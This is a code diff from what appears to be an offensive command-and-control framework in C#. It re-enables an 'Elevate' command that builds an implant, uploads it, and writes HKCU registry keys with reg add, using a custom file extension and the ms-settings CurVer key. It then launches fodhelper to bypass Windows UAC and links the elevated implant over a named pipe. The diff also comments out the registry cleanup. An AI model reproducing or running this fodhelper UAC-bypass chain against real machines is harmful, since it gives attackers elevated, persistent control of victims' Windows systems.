@@ -59,22 +59,21 @@ namespace Commander.Commands.Composite
 
         protected override void Run(ScriptingAgent<ElevateCommandOptions> agent, ScriptingCommander<ElevateCommandOptions> commander, ScriptingTeamServer<ElevateCommandOptions> teamServer, ElevateCommandOptions options, CommanderConfig config)
         {
-            /*var endpoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
+            var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");
             var payloadOptions = new ImplantConfig()
             {
                 Architecture =  options.x86 ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                 Endpoint = endpoint,
                 IsDebug = false,
                 IsVerbose = options.verbose,
-                ServerKey = config.ServerConfig.Key,
                 Type = ImplantType.Executable,
-                InjectionDelay =  options.injectDelay,
-                IsInjected = options.inject,
-                InjectionProcess = options.injectProcess
+                //InjectionDelay =  options.injectDelay,
+                //IsInjected = options.inject,
+                //InjectionProcess = options.injectProcess
             };
 
-            if (!string.IsNullOrEmpty(options.injectProcess))
-                payloadOptions.InjectionProcess = options.injectProcess;
+            //if (!string.IsNullOrEmpty(options.injectProcess))
+            //    payloadOptions.InjectionProcess = options.injectProcess;
 
             commander.WriteInfo($"[>] Generating Payload!");
             var pay = commander.GeneratePayload(payloadOptions, options.verbose);
@@ -101,10 +100,10 @@ namespace Commander.Commands.Composite
             agent.Upload(pay, path);
             agent.Delay(1);
             agent.Echo($"Altering registry Keys");
-            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\.{options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
-            agent.RegistryAdd(@$"HKCU\Software\Classes\.{options.key}\Shell\Open\command", string.Empty, path);
-            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{options.key}\" /f");
-            agent.RegistryAdd(@$"HKCU\Software\Classes\ms-settings\CurVer", string.Empty, $".{options.key}");
+            agent.Shell($"reg add \"HKCU\\Software\\Classes\\.{options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
+            //agent.RegistryAdd(@$"HKCU\Software\Classes\.{options.key}\Shell\Open\", "command", path);
+            agent.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{options.key}\" /f");
+            //agent.RegistryAdd(@$"HKCU\Software\Classes\ms-settings\", "CurVer", $".{options.key}");
             agent.Delay(5);
             agent.Echo($"Starting fodhelper");
             agent.Shell("fodhelper");
@@ -112,8 +111,8 @@ namespace Commander.Commands.Composite
             agent.Echo($"Cleaning");
             //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{options.key} -Recurse  -Force -Verbose");
             //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
-            agent.RegistryRemove(@"HKCU\Software\Classes\", $".{options.key}");
-            agent.RegistryRemove(@"HKCU\Software\Classes\ms-settings", $"CurVer");
+            //agent.RegistryRemove(@"HKCU\Software\Classes\", $".{options.key}");
+            //agent.RegistryRemove(@"HKCU\Software\Classes\ms-settings", $"CurVer");
             if (!options.inject)
             {
                 agent.Echo($"[!] Don't forget to remove executable after use! : del {path}");
@@ -126,11 +125,11 @@ namespace Commander.Commands.Composite
                 agent.DeleteFile(path);
             }
             agent.Echo($"Linking to {endpoint}");
-            var targetEndPoint = ConnexionUrl.FromString($"rpipe://127.0.0.1:{options.pipe}");
+            var targetEndPoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
             agent.Link(targetEndPoint);
             agent.Delay(2);
             agent.Echo($"[*] Execution done!");
-            agent.Echo(Environment.NewLine);*/
+            agent.Echo(Environment.NewLine);
         }
     }
 }
